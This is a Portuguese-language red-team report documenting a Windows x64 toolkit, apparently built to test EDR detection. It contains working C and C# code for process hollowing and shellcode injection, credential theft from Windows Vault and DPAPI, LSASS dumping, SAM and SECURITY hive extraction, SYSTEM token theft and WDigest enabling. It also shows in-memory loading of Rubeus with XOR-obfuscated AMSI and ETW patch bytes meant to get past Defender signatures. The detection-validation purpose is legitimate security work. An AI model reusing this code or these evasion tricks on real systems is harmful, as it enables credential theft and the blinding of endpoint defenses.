PT-2026-003 — Process Injection / Hollowing (T1055 / T1055.012) — Documentação completa
Injector + 4 payloads Windows x64 (C freestanding) + wrapper .NET. Parte de usuario comum sem admin.

Artefatos
Arquivo	TTP	SHA-256
hollow.exe	T1055.012, T1055.001	CC485B62433FBDEF5C58951F965DDEDEA1574BECBE43D843B5362B00419CF431
payload_a.exe	T1555.004, T1555.005	D2AC77D37C5984A0836AE0409A52953D929559E9155A14B2270C156E20EFD446
payload_d.exe	T1003.001/.002/.004, T1134	CA7B713FED6DA0ED3EA09EBA1FB3222FF39A6C3566C506A6D2BCB02E3591D008
payload_c.exe	T1620, T1558, T1562.001	362E265AEE23EBBF61C8961C058901F48B8BF908989F15506FFE29E99C383394
wrap.exe	T1620	D8E57724064DF0AED1E5DFBB09E529F64B8DE6F600BB9EF891E084CFE5865B57
Todos passam na leitura estatica do Defender. Payloads C são freestanding (zero imports).

1. hollow.exe — injector (T1055.012 / T1055.001)
Como funciona a técnica
O loader do Windows mapeia a imagem PE e salta para o AddressOfEntryPoint. O hollowing cria o processo suspenso (a thread ainda está parada em ntdll!RtlUserThreadStart, antes de executar qualquer instrução) e substitui a imagem:

// 1. cria o alvo suspenso
CreateProcessW(targetPath, NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

// 2. PEB -> ImageBaseAddress (x64 = PEB + 0x10)
NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &rl);
ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x10, &imageBase, 8, &read);

// 3. desmapeia a imagem legitima (sinal de detecção mais forte)
NtUnmapViewOfSection(pi.hProcess, (PVOID)imageBase);

// 4. aloca a nova imagem + escreve headers/seções + reloc
VirtualAllocEx(pi.hProcess, (LPVOID)preferredBase, sizeOfImage,
               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, (LPVOID)newImageBase, fileBuf, SizeOfHeaders, &written);
// ... cada seção ... + reloc IMAGE_REL_BASED_DIR64 se base != preferida ...

// 5. corrige PEB->ImageBaseAddress e aponta a thread pro entry do payload
WriteProcessMemory(pi.hProcess, (BYTE*)peb + 0x10, &newImageBase, 8, &written);
ctx.Rcx = newImageBase;                    // image base (param do entry x64)
ctx.Rip = newImageBase + entryRVA;         // AddressOfEntryPoint
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
APIs: NtQueryInformationProcess, NtUnmapViewOfSection (ntdll) + VirtualAllocEx, WriteProcessMemory, GetThreadContext, SetThreadContext, ResumeThread (kernel32).

Modo shellcode (T1055.001):

remote = VirtualAllocEx(pi.hProcess, NULL, fsize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remote, sc, fsize, &written);
CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
Como a evasão é feita
Sem admin: o usuário é o creator do processo; a DACL concede PROCESS_VM_WRITE/OPERATION/QUERY.
Sem CreateRemoteThread no RunPE: o payload entra reaproveitando a thread principal via SetThreadContext.
Alvo legítimo (notepad/WerFault) — sem nome suspeito.
Payloads freestanding (zero imports): o RunPE não processa IAT; tudo é resolvido em runtime (seção 5).
2. payload_a.exe — credenciais user-level (T1555.004 / T1555.005)
Como funcionam as técnicas
Vault (T1555.004): o Windows guarda credenciais em "vaults" via vaultcli.dll. Para Web Credentials, o elemento authenticator vem com a senha em plaintext.

typedef struct _VAULT_ITEM_W8 {
    GUID SchemaId; wchar_t* pszCredentialFriendlyName;
    VAULT_ITEM_ELEMENT* pResourceElement;      // alvo/recurso
    VAULT_ITEM_ELEMENT* pIdentityElement;      // username
    VAULT_ITEM_ELEMENT* pAuthenticatorElement; // senha/blob
    /* ... */
} VAULT_ITEM_W8;

VaultEnumerateVaults(0, &vaultCount, &vaults);
VaultOpenVault(&vaults[i], 0, &hv);
VaultEnumerateItems(hv, 0, &itemCount, (PVOID*)&items);

if (it->pIdentityElement->Type == 7 /*String*/)
    log_wstr(it->pIdentityElement->value.str);   // username em claro

VaultGetItem(hv, &it->SchemaId, it->pResourceElement, it->pIdentityElement,
             NULL, NULL, 0, &full);
// full->pAuthenticatorElement->value.str -> senha plaintext (Web Credentials)
DPAPI (T1555.005): CryptUnprotectData descifra os arquivos de %LOCALAPPDATA%\Microsoft\Credentials\* com a chave mestra do usuário.

DATA_BLOB in = { br, buf }, out;
if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out) && out.pbData)
    dump_strings(out.pbData, out.cbData);   // username/password em UTF-16
APIs: VaultEnumerateVaults, VaultOpenVault, VaultEnumerateItems, VaultGetItem, VaultFree (vaultcli.dll) + CryptUnprotectData (crypt32.dll).

Como a evasão é feita
Sem admin por natureza: DPAPI opera no contexto do próprio usuário.
Execução in-memory (via hollowing), nenhuma ferramenta no disco.
3. payload_d.exe — credenciais com admin (T1003.001/.002/.004 + T1134)
Como funcionam as técnicas
LSASS dump (T1003.001): LSASS guarda NT hashes, chaves Kerberos e (se WDigest) plaintext. Token steal (T1134) + hives (T1003.002): com SeDebug, rouba token SYSTEM e salva SAM/SECURITY/SYSTEM.

// SeDebugPrivilege
LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
AdjustTokenPrivileges(tok, 0, &tp, sizeof(tp), NULL, NULL);

// T1003.001
MiniDumpWriteDump(lsass, pid, hd, 0x00000002 /*MiniDumpWithFullMemory*/, NULL, NULL, NULL);

// T1134 (token SYSTEM p/ salvar hives)
OpenProcess(PROCESS_ALL_ACCESS, 0, wininitPid);
OpenProcessToken(hp, TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY|TOKEN_IMPERSONATE, &tok);
DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dup);
ImpersonateLoggedOnUser(dup);

// T1003.002
RegSaveKeyExA(HKLM, "SAM",      NULL, path, 0);
RegSaveKeyExA(HKLM, "SECURITY", NULL, path, 0);
RegSaveKeyExA(HKLM, "SYSTEM",   NULL, path, 0);

// T1003.004
RegSetValueExA(k, "UseLogonCredential", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
APIs: AdjustTokenPrivileges, MiniDumpWriteDump (dbghelp), DuplicateTokenEx, ImpersonateLoggedOnUser, RegSaveKeyExA, RegSetValueExA, RevertToSelf.

Como a evasão / hardening interage
Técnica mais barrada em máquina hardenizada: PPL (LSA protection) bloqueia OpenProcess(lsass) mesmo elevado (err=5), e callback de kernel do EDR bloqueia o token steal. A tentativa de acesso a LSASS/SAM é exatamente o sinal que o Falcon deve capturar.

4. payload_c.exe + wrap.exe — Rubeus embutido (T1620 + T1558 + T1562.001)
Como funcionam as técnicas
CLR hosting (T1620): o processo C hospeda o runtime .NET via mscoree.dll.

// 1. decrypt do Rubeus + base64 (string p/ o wrapper)
xor_decrypt(g_rubeus_enc, g_rubeus_enc_len, rubeusPlain);
b64_encode(rubeusPlain, g_rubeus_enc_len, payload);   // ~370 KB

// 2. host do CLR (COM, vtable manual)
CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, (void**)&metaHost);
metaHost->lpVtbl->GetRuntime(metaHost, L"v4.0.30319", &IID_ICLRRuntimeInfo, (void**)&rtInfo);
rtInfo->lpVtbl->GetInterface(rtInfo, &CLSID_CLRRuntimeHost, &IID_ICLRRuntimeHost, (void**)&clrHost);
clrHost->lpVtbl->Start(clrHost);

// 3. patch AMSI/ETW (ofuscado, em C) ANTES do Assembly.Load
patch_amsi();
patch_etw();

// 4. executa o wrapper, que carrega o Rubeus
clrHost->lpVtbl->ExecuteInDefaultAppDomain(clrHost, wTmp, L"Wrap.Program", L"Run", wPayload, &ret);
Assembly.Load(byte[]) (T1620): o wrap.exe decodifica a base64 e carrega o Rubeus direto da memória; reflexão invoca Rubeus.Program.Main (T1558).

public static int Run(string data) {
    string[] parts = data.Split('|');
    byte[] asm = Convert.FromBase64String(parts[0]);             // Rubeus
    string[] args = /* base64 -> UTF-8 -> Split(' ') */;
    Assembly a = Assembly.Load(asm);                              // T1620
    a.GetType("Rubeus.Program")
     .GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)
     .Invoke(null, new object[] { args });                        // T1558
}
Como a evasão é feita (camadas)
Rubeus nunca no disco — XOR-encrypted em embed.h, decriptado em memória, Assembly.Load(byte[]).
Patch AMSI (T1562.001): o .NET 4.8 escaneia Assembly.Load via AmsiScanBuffer; patchar para mov eax,0x80070057;ret faz o scan retornar "limpo".
Patch ETW (T1562.001): EtwEventWrite -> xor rax,rax;ret corta a telemetria ETW.
Bytes ofuscados (XOR 0x55): na 1ª versão o padrão B8 57 00 07 80 C3 em claro era signatured pelo Defender; ofuscar resolveu a detecção estática.
// mov eax, 0x80070057; ret  -> B8 57 00 07 80 C3  (XOR 0x55)
static const unsigned char g_amsi_patch[] = { 0xED, 0x02, 0x55, 0x52, 0xD5, 0x96 };
// xor rax, rax; ret         -> 48 33 C0 C3        (XOR 0x55)
static const unsigned char g_etw_patch[]  = { 0x1D, 0x66, 0x95, 0x96 };

static void patch_bytes(void* addr, const unsigned char* enc, int len) {
    if (!addr) return;
    unsigned char patch[16];
    for (int i = 0; i < len; i++) patch[i] = enc[i] ^ 0x55;
    DWORD old = 0;
    VirtualProtect(addr, len, 0x40, &old);
    for (int i = 0; i < len; i++) ((unsigned char*)addr)[i] = patch[i];
    VirtualProtect(addr, len, old, &old);
}

patch_bytes(rt_load("amsi.dll", "AmsiScanBuffer"), g_amsi_patch, 6);
patch_bytes(rt_load("ntdll.dll", "EtwEventWrite"), g_etw_patch, 4);
Wrapper mínimo (4 KB): dropado em %TEMP%, removido após execução (DeleteFileA + MoveFileEx DELAY_UNTIL_REBOOT).
O que permanece detectável
A evasão resolve a assinatura estática (Defender não flagga mais). A detecção comportamental (patch AMSI em runtime, Assembly.Load, NtUnmapViewOfSection) permanece visível ao EDR — é o sinal a validar no Falcon.

5. Base comum de evasão — runtime freestanding (rt.h)
Payloads C compilados -nostdlib + entry PayloadMain + zero imports. Como o RunPE não processa a IAT, tudo é resolvido em runtime:

static __inline void* rt_teb(void) {
    void* teb; __asm__ __volatile__("mov %%gs:0x30, %0" : "=r"(teb)); return teb;
}

static __inline void* rt_module_by_hash(u32 hash) {
    char* peb  = *(char**)((char*)rt_teb() + 0x60);   // TEB -> PEB
    char* ldr  = *(char**)(peb + 0x18);               // PEB -> Ldr
    char* head = ldr + 0x20;                          // InMemoryOrderModuleList
    char* e = *(char**)head;
    while (e && e != head) {
        char* entry = e - 0x10;
        void*  base = *(void**)(entry + 0x30);                // DllBase
        wchar_t* nm = *(wchar_t**)(entry + 0x58 + 8);         // BaseDllName (Buffer)
        if (rt_hash_wide(nm, len/2) == hash) return base;
        e = *(char**)e;
    }
    return NULL;
}
Efeito: sem IAT estática para fingerprint; shim.c fornece memcpy/memset/strlen em loops puros (sem msvcrt).

Resumo — técnica × evasão
.exe	TTP	Técnica (como funciona)	Evasão
hollow.exe	T1055.012, T1055.001	desmapear imagem legítima e substituir pelo payload / RWX + CreateRemoteThread	sem admin, sem CreateRemoteThread (RunPE), alvo legítimo, payload zero-imports
payload_a.exe	T1555.004, T1555.005	Vault API + CryptUnprotectData (chave do usuário)	in-memory, sem elevação
payload_d.exe	T1003.001/.002/.004, T1134	MiniDumpWriteDump LSASS + token steal + hives	bloqueado por PPL/callback EDR (sinal a validar)
payload_c.exe	T1620, T1558, T1562.001	CLR hosting + Assembly.Load(byte[])	Rubeus XOR no disco, patch AMSI/ETW ofuscado, execução in-memory
wrap.exe	T1620	decodifica base64 + Assembly.Load + invoke Main	assembly mínimo, dropado e removido
Documentação final em 4 arquivos: README.md, DESCRICAO-ARTEFATOS.md, DOCUMENTACAO-EXECUCAO.md, COMO-FUNCIONA.md e DOCUMENTACAO-COMPLETA.md (merge).


